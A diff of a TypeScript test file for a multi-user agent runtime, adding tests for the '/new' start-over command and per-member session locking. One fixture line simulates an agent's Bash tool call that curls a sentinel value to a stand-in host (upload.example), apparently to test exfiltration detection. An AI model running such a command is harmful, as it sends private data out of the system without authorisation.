@@ -138,6 +138,7 @@ async function fixture(backend: 'codex' | 'claude' = 'codex', withRoot = true) {
   const stopped: string[] = [];
   let failMember = false;
   let ownerGate: Promise<void> | undefined;
+  let memberGate: Promise<void> | undefined;
   let networkSentinel: string | undefined;
   const options: OwnerRuntimeOptions = {
     backend,
@@ -161,6 +162,7 @@ async function fixture(backend: 'codex' | 'claude' = 'codex', withRoot = true) {
       loaded: true,
     }),
     ...(withRoot ? { memberRoot: root } : {}),
+    sessionPool: pool,
     createSession: (nativeOptions: NativeSessionOptions) => {
       const principal = nativeOptions.principal?.principalId ?? 'owner';
       const started = new Set<string>();
@@ -195,6 +197,7 @@ async function fixture(backend: 'codex' | 'claude' = 'codex', withRoot = true) {
             context: opts?.toolExecutionContext,
           });
           if (principal === 'owner' && ownerGate) await ownerGate;
+          if (principal !== 'owner' && memberGate) await memberGate;
           if (networkSentinel) {
             callbacks?.onToolUse?.('Bash', {
               command: `curl -d ${networkSentinel} https://upload.example/private?q=${networkSentinel}`,
@@ -267,6 +270,9 @@ async function fixture(backend: 'codex' | 'claude' = 'codex', withRoot = true) {
     },
     blockOwner: (gate: Promise<void>) => {
       ownerGate = gate;
+    },
+    blockMember: (gate: Promise<void> | undefined) => {
+      memberGate = gate;
     },
     fail: () => {
       failMember = true;
@@ -865,6 +871,111 @@ it.each(['codex', 'claude'] as const)(
     expect(f.stopped.sort()).toEqual(['owner', f.member].sort());
   }
 );
+
+it('starts a conversation over only while nothing of that person runs or waits (/new)', async () => {
+  const f = await fixture('claude');
+  f.options.roomChannels = ['-7001'];
+  const runtime = await createOwnerRuntime(f.options);
+  try {
+    const dm = { kind: 'member' as const, principalId: f.member };
+    const room = { ...dm, room: '-7001' };
+    const dmKey = `member:${f.member}:runtime`;
+    const roomKey = `member:${f.member}:room:telegram:-7001`;
+    const memberTurns = () => f.turns.filter((turn) => turn.principal === f.member).length;
+    // A member turn holds their chain: every conversation of theirs is busy, not only its own.
+    let releaseMember!: () => void;
+    f.blockMember(new Promise<void>((resolve) => (releaseMember = resolve)));
+    const intake = runtime.memberIntake(f.member);
+    intake.acceptOwnerMessage({
+      id: 'fixture:member-running',
+      channelKey: 'fixture',
+      occurredAt: 4,
+      text: 'member running',
+    });
+    await vi.waitFor(() => expect(memberTurns()).toBe(1), { timeout: 5_000 });
+    expect(runtime.turnRunning(dm)).toBe(true);
+    expect(runtime.turnRunning(room)).toBe(false);
+    expect(await runtime.startOver(dm)).toBe('busy');
+    expect(await runtime.startOver(room)).toBe('busy');
+    // A message sent meanwhile queues behind the running turn (waiting-input.test.ts covers the
+    // mailbox side of busy).
+    intake.acceptOwnerMessage({
+      id: 'fixture:member-waiting',
+      channelKey: 'fixture',
+      occurredAt: 5,
+      text: 'member waiting',
+    });
+    f.blockMember(undefined);
+    releaseMember();
+    await vi.waitFor(() => expect(intake.isPending!('fixture:member-waiting')).toBe(false), {
+      timeout: 5_000,
+    });
+    expect(f.pool.peekSession(dmKey).sessionId).toBeDefined();
+    runtime.memberIntake(f.member, '-7001');
+    f.pool.getSession(roomKey);
+    f.pool.releaseSession(roomKey);
+    // A DM reset takes the member's group conversations with it.
+    expect(await runtime.startOver(dm)).toBe('started_over');
+    expect(f.pool.peekSession(dmKey).sessionId).toBeUndefined();
+    expect(f.pool.peekSession(roomKey).sessionId).toBeUndefined();
+    // The common session has its own chain: a running common turn makes only it busy.
+    let releaseOwner!: () => void;
+    f.blockOwner(new Promise<void>((resolve) => (releaseOwner = resolve)));
+    runtime.intake.acceptOwnerMessage({
+      id: 'fixture:owner-running',
+      channelKey: 'fixture',
+      occurredAt: 6,
+      text: 'owner running',
+    });
+    await vi.waitFor(() => expect(runtime.turnRunning({ kind: 'common' })).toBe(true), {
+      timeout: 5_000,
+    });
+    expect(await runtime.startOver({ kind: 'common' })).toBe('busy');
+    releaseOwner();
+    await vi.waitFor(() => expect(runtime.intake.isPending!('fixture:owner-running')).toBe(false));
+    expect(f.pool.peekSession('owner:runtime').sessionId).toBeDefined();
+    // The common turn's own follow-up work (its record order) keeps the common session busy.
+    await vi.waitFor(
+      async () => expect(await runtime.startOver({ kind: 'common' })).toBe('started_over'),
+      { timeout: 5_000 }
+    );
+    expect(f.pool.peekSession('owner:runtime').sessionId).toBeUndefined();
+    // A member enrolled after boot is served first, so their conversation exists to start over.
+    const enrolled = createPrincipalRepository(runtime.database.adapter).registerMember({
+      connector: 'telegram',
+      namespace: 'private',
+      externalId: 'fixture-enrolled-new',
+      now: 7,
+    });
+    expect(runtime.runtime.servesPrincipal(enrolled)).toBe(false);
+    expect(await runtime.startOver({ kind: 'member', principalId: enrolled })).toBe('started_over');
+    expect(runtime.runtime.servesPrincipal(enrolled)).toBe(true);
+  } finally {
+    await runtime.stop();
+  }
+});
+
+it('starts over with the DM a group conversation kept from before a restart (/new)', async () => {
+  const f = await fixture('codex');
+  f.options.roomChannels = ['-7001'];
+  const before = await createOwnerRuntime(f.options);
+  try {
+    // The room's session opens, and its state stays on disk after the daemon stops.
+    before.memberIntake(f.member, '-7001');
+  } finally {
+    await before.stop();
+  }
+  const runtime = await createOwnerRuntime(f.options);
+  try {
+    const roomKey = `member:${f.member}:room:telegram:-7001`;
+    f.pool.getSession(roomKey);
+    f.pool.releaseSession(roomKey);
+    expect(await runtime.startOver({ kind: 'member', principalId: f.member })).toBe('started_over');
+    expect(f.pool.peekSession(roomKey).sessionId).toBeUndefined();
+  } finally {
+    await runtime.stop();
+  }
+});
 
 it('fails boot naming member_root with an active member, before starting a backend', async () => {
   const f = await fixture('codex', false);
